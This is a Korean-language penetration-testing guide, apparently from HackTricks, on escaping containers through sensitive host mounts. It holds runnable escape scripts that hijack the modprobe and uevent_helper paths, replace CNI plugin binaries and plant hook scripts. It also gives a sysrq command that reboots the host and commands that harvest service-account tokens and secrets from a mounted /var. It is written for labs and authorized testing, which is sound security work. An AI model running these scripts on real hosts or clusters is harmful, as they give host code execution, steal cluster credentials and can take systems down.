# 민감한 호스트 마운트

{{#include ../../../banners/hacktricks-training.md}}

## 개요

호스트 마운트는 격리된 프로세스 뷰를 호스트 리소스에 직접 접근할 수 있는 상태로 되돌리는 경우가 많으므로, 실질적인 컨테이너 탈출 공격 표면 중에서도 가장 중요합니다. 위험한 경우는 `/` 마운트에만 국한되지 않습니다. `/proc`, `/sys`, `/var`, 런타임 소켓, kubelet이 관리하는 상태 디렉터리, 기기 관련 경로를 바인드 마운트하면 커널 제어 기능, 자격 증명, 인접 컨테이너의 파일시스템, 런타임 관리 인터페이스가 노출될 수 있습니다.

이 주제는 개별 보호 페이지와 별도로 다룹니다. 악용 모델이 여러 영역에 걸쳐 있기 때문입니다. 쓰기 가능한 호스트 마운트가 위험한 이유에는 마운트 네임스페이스, 사용자 네임스페이스, AppArmor 또는 SELinux의 적용 범위, 그리고 노출된 구체적인 호스트 경로가 모두 관련됩니다. 이 주제를 별도로 다루면 공격 표면을 훨씬 쉽게 파악할 수 있습니다.

또한 호스트에서 쓰기 가능한 디렉터리를 각 컨테이너 내부의 대응 경로와 비교하세요. 해당 경로가 실행 가능한 시작 스크립트가 들어 있는 디렉터리 위에 마운트되어 있다면, 권한이 낮은 호스트 사용자가 코드를 심어 두고 컨테이너가 다음에 재시작될 때 권한이 더 높은 컨테이너 entrypoint가 이를 로드하게 할 수 있습니다. 정확한 바인드 소스와 대상, 디렉터리 쓰기/검색 권한, entrypoint의 반복 처리 및 실행 파일 요구 사항, 런타임 UID, 실제 재시작 트리거를 확인하세요. 컨테이너 UID 0이 자동으로 호스트 UID 0이 되는 것은 아닙니다. 호스트에 미치는 영향은 사용자 네임스페이스 매핑과 마운트 정책에 따라 결정됩니다. 수동 검토에서는 스크립트를 쓰거나 워크로드를 재시작하지 말고 경로와 권한을 보고해야 합니다.

Linux 컨테이너가 별도의 Windows 호스트 파일시스템 일부를 공유하는 관리 VM 안에서 실행될 수도 있습니다. [VirtualBox 공유 폴더](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html)는 호스트 파일을 게스트에서 볼 수 있게 되는 한 가지 방법이지만, 해당 VM의 root는 여전히 Windows 관리자와는 별개의 신원입니다. 공유 폴더를 통해 사용자의 SSH 개인 키를 읽을 수 있다면 이를 자격 증명 관련 단서로 취급하세요. 호스트에 연결된 정확한 마운트, 키 소유권과 접근 권한, 해당 계정, Windows SSH 서버의 **유효한** authorized-key 정책을 확인한 뒤에야 호스트 로그인을 허용한다고 결론 내릴 수 있습니다. 최신 [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement)는 관리자 계정에 별도의 `administrators_authorized_keys` 파일을 사용하는 경우가 많습니다. 일반적인 열거 결과에 개인 키 내용을 포함하지 마세요. 수동 분류에는 마운트와 키 경로의 메타데이터만으로 충분합니다.

## `/proc` 노출

procfs에는 일반적인 프로세스 정보와 영향력이 큰 커널 제어 인터페이스가 모두 포함되어 있습니다. 따라서 `-v /proc:/host/proc`와 같은 바인드 마운트 또는 예상치 못한 쓰기 가능한 proc 항목을 노출하는 컨테이너 뷰는 정보 공개, 서비스 거부, 직접적인 호스트 코드 실행으로 이어질 수 있습니다.

중요도가 높은 procfs 경로는 다음과 같습니다.

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (특히 `register` 및 `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 악용

먼저 중요도가 높은 procfs 항목 중 어떤 항목이 표시되거나 쓰기 가능한지 확인하세요:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

이 경로들은 서로 다른 이유로 주목할 만합니다. `core_pattern`, `modprobe`, `binfmt_misc`는 쓰기 가능한 경우 호스트 코드 실행 경로가 될 수 있습니다. `kallsyms`, `kmsg`, `kcore`, `config.gz`는 kernel exploitation에 유용한 강력한 정찰 정보원입니다. `sched_debug`와 `mountinfo`는 프로세스, cgroup, filesystem 관련 맥락을 드러내므로 컨테이너 내부에서 호스트의 구조를 재구성하는 데 도움이 됩니다.

각 경로의 실질적인 가치는 다릅니다. 이들을 모두 같은 영향력을 가진 것처럼 취급하면 triage가 더 어려워집니다.

- `/proc/sys/kernel/core_pattern`
  쓰기 가능하다면, 커널이 crash 후 pipe handler를 실행하므로 가장 영향력이 큰 procfs 경로 중 하나입니다. 컨테이너에서 `core_pattern`이 overlay에 있거나 마운트된 호스트 경로에 있는 payload를 가리키도록 설정할 수 있으면, 호스트 코드 실행을 얻을 수 있는 경우가 많습니다. 전용 예시는 [read-only-paths.md](protections/read-only-paths.md)도 참고하세요.
- `/proc/sys/kernel/modprobe`
  이 경로는 커널이 module-loading 로직을 호출해야 할 때 사용하는 userspace helper를 제어합니다. 컨테이너에서 쓰기 가능하고 호스트 컨텍스트에서 해석된다면, 또 다른 호스트 코드 실행 primitive가 될 수 있습니다. 특히 helper 경로를 트리거할 방법과 결합하면 주목할 만합니다.
- `/proc/sys/vm/panic_on_oom`
  보통 깔끔한 escape primitive는 아니지만, OOM 상황을 kernel panic 동작으로 전환해 호스트 전체에 denial of service를 일으킬 수 있습니다.
- `/proc/sys/fs/binfmt_misc`
  등록 인터페이스가 쓰기 가능하다면, 공격자는 선택한 magic value에 대한 handler를 등록해 일치하는 파일이 실행될 때 호스트 컨텍스트에서 코드를 실행할 수 있습니다.
- `/proc/config.gz`
  kernel exploit triage에 유용합니다. 호스트 package metadata 없이 어떤 subsystem, mitigation, 선택적 kernel feature가 활성화되어 있는지 확인할 수 있습니다.
- `/proc/sysrq-trigger`
  주로 denial-of-service 경로지만, 매우 심각합니다. 호스트를 즉시 reboot하거나 panic을 일으키거나 다른 방식으로 중단시킬 수 있습니다.
- `/proc/kmsg`
  kernel ring buffer 메시지를 노출합니다. 호스트 fingerprinting, crash 분석에 유용하며, 일부 환경에서는 kernel exploitation에 도움이 되는 정보를 leak할 수 있습니다.
- `/proc/kallsyms`
  읽을 수 있는 경우 유용합니다. export된 kernel symbol 정보를 노출하며, kernel exploit 개발 중 address randomization 가정을 우회하는 데 도움이 될 수 있습니다.
- `/proc/[pid]/mem`
  직접적인 process-memory 인터페이스입니다. 필요한 ptrace 방식의 조건을 충족해 대상 프로세스에 접근할 수 있다면, 다른 프로세스의 메모리를 읽거나 수정할 수 있습니다. 실제 영향은 credentials, `hidepid`, Yama, ptrace 제한에 크게 좌우되므로 강력하지만 조건부인 경로입니다.
- `/proc/kcore`
  시스템 메모리를 core-image 형식으로 보여줍니다. 파일이 매우 크고 다루기 까다롭지만, 의미 있는 수준으로 읽을 수 있다면 호스트 메모리 노출이 심각하다는 뜻입니다.
- `/dev/kmem` 및 `/dev/mem`
  이들은 procfs 파일이 아니라, 역사적으로 영향력이 큰 raw-memory **device** 인터페이스입니다. 많은 최신 시스템에서 없거나 엄격히 제한되어 있지만, 컨테이너에서 호스트에 마운트된 사본을 열 수 있다면 해당 노출을 critical로 취급해야 합니다. 존재하지 않는 `/proc/kmem` 또는 `/proc/mem` 경로를 찾기보다 다른 민감한 `/dev` 마운트와 함께 검토하세요.
- `/proc/sched_debug`
  scheduling 및 task 정보를 leak하므로, 다른 process view가 예상보다 깔끔해 보이는 경우에도 호스트 프로세스의 identity를 드러낼 수 있습니다.
- `/proc/[pid]/mountinfo`
  컨테이너가 호스트에서 실제로 어디에 위치하는지, 어떤 경로가 overlay를 사용하는지, 쓰기 가능한 mount가 호스트 콘텐츠에 해당하는지 아니면 컨테이너 레이어에만 해당하는지 재구성하는 데 매우 유용합니다.

`/proc/[pid]/mountinfo` 또는 overlay 세부 정보를 읽을 수 있다면 이를 이용해 컨테이너 filesystem의 호스트 경로를 찾아내세요:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

이 명령들은 컨테이너 내부의 경로를 호스트 관점에서 대응하는 경로로 변환해야 하는 여러 호스트 실행 기법에 유용합니다.

### 예시: `modprobe` 헬퍼 경로 준비

컨테이너에서 `/proc/sys/kernel/modprobe`에 쓰기 권한이 있고 헬퍼 경로가 호스트 컨텍스트에서 해석된다면, 공격자가 제어하는 페이로드를 가리키도록 경로를 변경할 수 있습니다. overlay upper 디렉터리는 호스트 기준으로 해석되어야 하며, 컨테이너가 호스트의 `/tmp`도 마운트하지 않는다면 proof 출력은 호스트에서 접근할 수 있는 동일한 컨테이너 레이어에 기록해야 합니다:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

정확한 트리거는 대상과 커널 동작에 따라 달라지므로 의도적으로 추측하지 않습니다. 실습을 마치기 전에 원래 값을 복원하세요. 중요한 점은 쓰기 가능한 helper 경로를 통해 향후 커널 helper 호출이 공격자가 제어하는 호스트 경로 콘텐츠로 리디렉션될 수 있다는 것입니다. `upperdir` 오버레이가 없거나, 호스트에서 경로를 확인할 수 없거나, sysctl 마운트가 읽기 전용이거나, 커널이 선택한 helper를 호출하지 않으면 이 체인이 끊어집니다.

### 전체 예시: `kallsyms`, `kmsg`, `config.gz`를 사용한 커널 정찰

즉시 탈출하는 대신 exploitability를 평가하는 것이 목표라면:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

이 명령어들은 유용한 심볼 정보가 표시되는지, 최근 커널 메시지에서 흥미로운 상태를 확인할 수 있는지, 그리고 어떤 커널 기능이나 완화책이 컴파일되어 포함되었는지 파악하는 데 도움이 됩니다. 일반적으로 직접적인 탈출로 이어지지는 않지만, 커널 취약점 triage에 걸리는 시간을 크게 줄일 수 있습니다.

### 전체 예시: SysRq 호스트 재부팅

`/proc/sysrq-trigger`에 쓰기 권한이 있고 호스트 뷰에 접근할 수 있다면:

```bash
echo b > /proc/sysrq-trigger
```

영향은 즉시 호스트 재부팅으로 나타납니다. 미묘한 예시는 아니지만, procfs 노출이 단순한 정보 공개보다 훨씬 심각한 결과를 초래할 수 있음을 분명히 보여줍니다.

## `/sys` 노출

sysfs는 커널 및 장치 상태를 대량으로 노출합니다. 일부 sysfs 경로는 주로 핑거프린팅에 유용하지만, 다른 경로는 helper 실행, 장치 동작, 보안 모듈 구성 또는 펌웨어 상태에 영향을 줄 수 있습니다.

중요도가 높은 sysfs 경로는 다음과 같습니다.

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

이 경로들은 각각 다른 이유로 중요합니다. `/sys/class/thermal`은 열 관리 동작에 영향을 줄 수 있으므로, 제대로 제한되지 않은 환경에서는 호스트 안정성에 영향을 미칠 수 있습니다. `/sys/kernel/vmcoreinfo`는 크래시 덤프 및 커널 레이아웃 정보를 leak할 수 있으며, 이는 저수준 호스트 핑거프린팅에 도움이 됩니다. `/sys/kernel/security`는 Linux Security Modules가 사용하는 `securityfs` 인터페이스이므로, 예상치 못한 접근으로 MAC 관련 상태가 노출되거나 변경될 수 있습니다. EFI 변수 경로는 펌웨어 기반 부팅 설정에 영향을 줄 수 있어 일반 구성 파일보다 훨씬 심각합니다. `/sys/kernel/debug` 아래의 `debugfs`는 특히 위험합니다. 개발자용 인터페이스로 설계되어, 강화된 프로덕션용 커널 API에 비해 안전성에 대한 기대 수준이 훨씬 낮기 때문입니다.

이 목록의 모든 sysfs 항목은 **커널, 구성 및 하드웨어에 따라 달라집니다**. 현재의 가상화 노드에는 `uevent_helper`, EFI 변수 및 열 장치 항목이 아예 없는 경우가 흔합니다. 다른 커널을 대상으로 한 예제가 적용된다고 가정하지 말고, 경로가 없으면 필수 조건이 충족되지 않은 것으로 기록하세요.

이 경로를 검토할 때 유용한 명령은 다음과 같습니다.

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

이 명령들이 흥미로운 이유:

- `/sys/kernel/security`를 통해 AppArmor, SELinux 또는 다른 LSM 인터페이스가 호스트 전용으로 남아 있어야 할 방식과 달리 노출되어 있는지 확인할 수 있습니다.
- `/sys/kernel/debug`는 이 그룹에서 가장 우려스러운 항목인 경우가 많습니다. `debugfs`가 마운트되어 있고 읽기 또는 쓰기가 가능하다면, 정확한 위험도는 활성화된 debug 노드에 따라 달라지는 광범위한 커널 인터페이스가 노출되어 있을 수 있습니다.
- EFI 변수 노출은 흔하지 않지만, 일반 런타임 파일이 아닌 펌웨어 기반 설정에 영향을 주므로 발생하면 영향이 큽니다.
- `/sys/class/thermal`은 깔끔한 셸 방식의 탈출보다는 호스트 안정성과 하드웨어 상호작용 측면에서 주로 중요합니다.
- `/sys/kernel/vmcoreinfo`는 주로 호스트 핑거프린팅 및 크래시 분석에 활용되며, 저수준 커널 상태를 파악하는 데 유용합니다.

### 전체 예시: `uevent_helper`

`/sys/kernel/uevent_helper`는 커널 및 설정에 따라 달라지며, 최신 시스템에서는 존재하지 않는 경우가 많습니다. 이 파일이 존재하고 쓰기 가능하며 사용할 수 있는 `uevent` 트리거가 있다면, 커널이 공격자가 제어하는 헬퍼를 실행할 수 있습니다. 증명 출력에는 호스트와 컨테이너 양쪽에서 모두 보이는 경로를 사용해야 합니다:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

이 방법이 작동하는 이유는 helper 경로가 호스트 관점에서 해석되기 때문입니다. 트리거되면 helper는 현재 컨테이너 내부가 아니라 호스트 컨텍스트에서 실행됩니다. `/sys/class/mem/null/uevent`는 해당 파일을 노출하는 커널에서 사용할 수 있는 구체적인 트리거 중 하나입니다. 다른 장치에도 자체 `uevent` 파일이 있을 수 있지만, 실제 하드웨어에서 아무 파일이나 맹목적으로 선택하지 마세요. 실습 환경을 벗어나기 전에 원래 값을 복원하세요. helper 파일이나 제어 가능한 트리거가 없다면 이 기법을 사용할 수 있다고 보고하지 마세요.

## `/var` 노출

호스트의 `/var`를 컨테이너에 마운트하는 것은 `/`를 마운트하는 것만큼 극적으로 보이지 않아 종종 그 위험이 과소평가됩니다. 실제로는 런타임 소켓, 컨테이너 스냅샷 디렉터리, kubelet이 관리하는 pod 볼륨, 프로젝션된 service-account 토큰, 인접한 애플리케이션 파일시스템에 접근할 수 있습니다. 최신 노드에서는 컨테이너의 운영상 가장 중요한 상태가 실제로 `/var`에 있는 경우가 많습니다.

### Kubernetes 예시

`hostPath: /var`가 설정된 pod는 다른 pod의 프로젝션된 토큰과 overlay 스냅샷 콘텐츠를 읽을 수 있는 경우가 많습니다:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

이 명령은 마운트에 별다른 영향이 없는 애플리케이션 데이터만 노출되는지, 아니면 영향력이 큰 클러스터 자격 증명까지 노출되는지 확인하는 데 유용합니다. 읽을 수 있는 service-account token이 있으면 로컬 코드 실행만으로 Kubernetes API에 즉시 접근할 수 있습니다.

token이 있으면 token을 찾는 데 그치지 말고, 해당 token으로 접근할 수 있는 항목을 확인하세요:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

여기서의 영향은 로컬 노드 접근보다 훨씬 클 수 있습니다. 광범위한 RBAC 권한을 가진 토큰은 마운트된 `/var`를 통해 클러스터 전체를 침해할 수 있습니다.

### Docker 및 containerd 예시

Docker 호스트에서는 관련 데이터가 대개 `/var/lib/docker` 아래에 있으며, containerd를 사용하는 Kubernetes 노드에서는 `/var/lib/containerd` 또는 snapshotter별 경로에 있을 수 있습니다:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

마운트된 `/var`를 통해 다른 workload의 snapshot 내용에 쓰기 접근할 수 있다면, 공격자는 현재 컨테이너 설정을 건드리지 않고도 애플리케이션 파일을 변경하거나, 웹 콘텐츠를 심거나, 시작 스크립트를 바꿀 수 있습니다.

**폐기 가능한 lab workload**에서는 쓰기 가능한 snapshot 콘텐츠를 이용해 애플리케이션 변조, secret 복구 또는 lateral movement를 시연할 수 있습니다. 먼저 runtime container ID를 정확한 snapshot에 매핑하고, 관련 없는 snapshot이나 production snapshot은 절대 수정하지 마세요:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

이 명령은 마운트된 `/var`가 미치는 세 가지 주요 영향 범주, 즉 애플리케이션 변조, 비밀 정보 복구, 인접 워크로드로의 lateral movement를 보여 주므로 유용합니다.

직접 스냅샷에 쓰면 runtime의 일반적인 상태 관리 과정을 우회해 컨테이너가 손상되거나 증거가 파괴될 수 있습니다. 읽기 전용 탐색은 Docker `overlay2`를 대상으로 로컬에서 재현했습니다. 인접한 일회용 컨테이너에 기록한 마커가 `/var/lib/docker/overlay2/<id>/diff/` 아래에 나타났습니다. 실제 스냅샷 수정은 해당 테스트를 위해 생성한 일회용 컨테이너로만 제한하세요.

## Kubelet 상태, 플러그인 및 CNI 경로

`/var/lib/kubelet`, `/opt/cni/bin` 또는 `/etc/cni/net.d`의 마운트는 권한이 있는 DaemonSets, CNI 에이전트, CSI 노드 플러그인, GPU operator 및 스토리지 헬퍼를 통해 노출되는 경우가 많습니다. 이러한 마운트는 "노드 배관" 정도로 치부하기 쉽지만, 새 pod의 실행 경로에 직접 위치하며 kubelet 자격 증명, projected secret, 등록 소켓, 호스트 측 플러그인 실행 파일을 포함하는 경우가 많습니다.

가치가 높은 대상은 다음과 같습니다.

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

유용한 검토 명령은 다음과 같습니다.

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

이 경로들이 중요한 이유:

- `/var/lib/kubelet/pki`에는 kubelet 클라이언트 인증서와 기타 노드 로컬 자격 증명이 노출될 수 있으며, 클러스터 설계에 따라 이를 API 서버나 kubelet과 통신하는 TLS 엔드포인트에 재사용할 수 있습니다.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods`에는 같은 노드의 인접한 pod에 마운트된 프로젝션된 service-account 토큰과 Secrets가 들어 있는 경우가 많습니다.
- `/var/lib/kubelet/pod-resources/kubelet.sock`은 주로 정찰 표면이지만, 매우 유용합니다. 현재 어떤 pod와 컨테이너가 GPU, hugepages, SR-IOV 장치 및 기타 희소한 노드 로컬 리소스를 사용하는지 보여 줍니다.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, `/var/lib/kubelet/plugins_registry`를 통해 설치된 CSI, DRA, device plugin과 kubelet이 통신할 것으로 예상되는 소켓을 확인할 수 있습니다. 이 디렉터리가 읽기 전용이 아니라 쓰기 가능한 경우, 문제의 심각성이 훨씬 커집니다.<sup>[[1]](#references)</sup>
- `/opt/cni/bin`과 `/etc/cni/net.d`는 pod 네트워크 설정 경로에 직접 위치합니다. 여기에 쓰기 권한이 있으면 단순히 설정이 노출되는 데 그치지 않고, 나중에 호스트에서 코드를 실행할 수 있는 수단이 되는 경우가 많습니다.<sup>[[2]](#references)</sup>

### 전체 예시: 쓰기 가능한 `/opt/cni/bin`

호스트의 CNI 바이너리 디렉터리가 읽기-쓰기로 마운트되어 있다면, 플러그인을 교체하는 것만으로도 kubelet이 해당 노드에서 다음 pod 샌드박스를 생성할 때 호스트에서 코드를 실행할 수 있습니다.<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

이는 마운트된 `docker.sock`만큼 즉각적인 방법은 아니지만, 침해된 Kubernetes 인프라 Pod에서는 더 현실적인 경우가 많습니다. 마커는 마운트된 플러그인 옆에 기록되므로, 컨테이너는 host-root나 host-`/tmp` 마운트가 없어도 이를 가져올 수 있습니다. wrapper는 원래 인자와 표준 입력을 그대로 전달한 다음, 예제에서는 원래 바이너리를 복원합니다. 중요한 점은 수정된 바이너리가 현재 컨테이너가 아니라 호스트 네트워크 설정 흐름에 의해 나중에 실행된다는 것입니다. 잘못된 wrapper는 새 Pod 샌드박스에 네트워킹을 제공하지 못하게 할 수 있으므로, 폐기 가능한 노드에서만 사용하세요.

## 런타임 소켓

민감한 호스트 마운트에는 전체 디렉터리 대신 런타임 소켓이 포함되는 경우가 많습니다. 이는 매우 중요하므로 여기서 명시적으로 다시 강조할 필요가 있습니다:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

이 소켓 중 하나가 마운트된 후의 전체 exploitation 흐름은 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)를 참조하세요.

빠르게 초기 상호작용을 시작하는 패턴은 다음과 같습니다:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

이 중 하나라도 성공하면, "mounted socket"에서 "더 높은 권한의 sibling container 시작"으로 이어지는 경로는 보통 어떤 커널 breakout 경로보다도 훨씬 짧습니다.

같은 daemon 접근 권한으로 **host persistence**도 설정할 수 있습니다. 쓰기 가능한 host-root bind mount가 있는 helper container에 `docker cp`로 파일을 전송한 다음, `docker exec`를 사용해 mount된 host 경로에 SSH 키, service unit 또는 다른 persistence 파일을 배치할 수 있습니다. 보안 경계는 host mount를 생성하는 daemon의 권한입니다. `docker cp`는 단지 파일을 준비하는 단계일 뿐입니다. runtime socket이 노출된 뒤 새로 생성된 container와 host 인증 또는 시작 경로에 대한 쓰기를 모두 감사하세요.

## Writable Host Path Task Hijack

쓰기 가능한 host mount가 위험해지기 위해 `/`를 노출할 필요는 없습니다. mount된 경로에 스크립트, config 파일, hook, plugin 또는 host 측 scheduled task나 service가 나중에 사용하는 파일이 있으면, container가 host에서 실행할 내용을 변경할 수 있습니다.

일반적인 검토 절차:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

호스트 프로세스가 소비하는 쓰기 가능한 파일을 테스트할 때는 payload를 단순하고 관찰 가능하게 유지하세요:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

흥미로운 부분은 신뢰 경계입니다. 쓰기는 컨테이너 내부에서 이루어지지만, 실행은 나중에 호스트 서비스 컨텍스트에서 이루어집니다. 이로 인해 제한적인 hostPath 또는 bind mount가 지연된 호스트 코드 실행 수단으로 바뀝니다.

## 공유 호스트 경로의 Root 소유 파일

root가 될 수 있는 컨테이너 계정은 호스트에서도 사용하는 쓰기 가능한 경로에 root 소유 파일을 배치할 수 있습니다. 컨테이너 UID 0이 호스트 UID 0에 매핑되고, 두 경로가 동일한 파일을 가리키며, 호스트 mount가 SUID 실행을 허용한다면, 해당 경로에서 root 소유 SUID 실행 파일을 실행할 수 있는 호스트 사용자는 호스트 권한 경계를 넘을 수 있습니다. 이 특정 파일 소유권 문제를 악용하기 위해 컨테이너를 `--privileged`로 실행할 필요는 없습니다. 별도의 조건은 [user namespace mappings](protections/namespaces/user-namespace.md) 및 [SUID discussion](privileged-containers.md)을 참조하세요.

**양쪽에서** 경로를 검토하세요. 정상 파일의 소유권과 식별자를 비교하고, 컨테이너의 `uid_map`과 `gid_map`을 확인하며, 호스트의 mount 옵션과 실행 정책을 살펴보세요. 컨테이너 측 `rw`에 `nosuid`가 없는 것은 후보일 뿐입니다. 이것만으로는 호스트 소유권, 호스트 mount 플래그, 호스트 사용자의 접근 권한, 또는 AppArmor/SELinux가 실행을 차단하는지 확인할 수 없습니다. `noexec`는 적용되는 뷰에서 실행을 제한합니다. `/proc/self/mountinfo`의 `shared:` 및 `master:` 태그는 mount 전파를 나타내며, 파일 내용이 호스트와 공유되는지는 나타내지 않습니다. bind mount에는 이러한 태그가 없을 수도 있습니다. 호스트 로그인을 가능하게 하는 자격 증명 재사용은 공유 파일 권한 경계와 별개의 단계입니다.

호스트의 런타임 저장소는 명시적인 bind mount가 없어도 유사한 경로를 만들 수 있습니다. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558)은 권한이 없는 호스트 사용자가 Docker 데이터 하위 디렉터리를 탐색하고 컨테이너 파일시스템의 파일을 실행할 수 있게 했습니다. Moby는 20.10.9에서 권한을 수정했으며, 디렉터리를 바로잡으려면 실행 중인 컨테이너를 재시작해야 한다고 안내합니다. 정확한 마운트 경로인 `overlay2/<id>/merged`와 각 상위 디렉터리의 탐색 권한을 검토한 다음, 컨테이너 UID 0이 호스트 UID 0에 매핑되는지, 실제 root 소유 SetUID 실행 파일이 존재하고 접근 가능한지, 호스트 뷰에서 SetUID 실행이 허용되는지 확인하세요. Rootless 또는 user-namespace-remapped 컨테이너, `nosuid`, `noexec`, `no_new_privs`, MAC 정책은 결과를 바꿀 수 있습니다. 런타임 버전이나 탐색 가능한 경로만으로는 호스트 root 실행이 입증되지 않습니다. 후보 실행 파일을 실행하지 말고 mount 및 파일 메타데이터를 확인하세요.

## Mount 관련 CVE

호스트 mount는 런타임 취약점과도 관련이 있습니다. 최근의 주요 사례는 다음과 같습니다.

- `runc`의 `CVE-2024-21626`: 유출된 디렉터리 파일 디스크립터로 인해 작업 디렉터리가 호스트 파일시스템에 위치할 수 있었습니다.
- BuildKit의 `CVE-2024-23651`, `CVE-2024-23652`, `CVE-2024-23653`: 악성 Dockerfile, frontend, `RUN --mount` 흐름으로 빌드 중 호스트 파일 접근, 삭제 또는 권한 상승이 다시 가능해질 수 있었습니다.
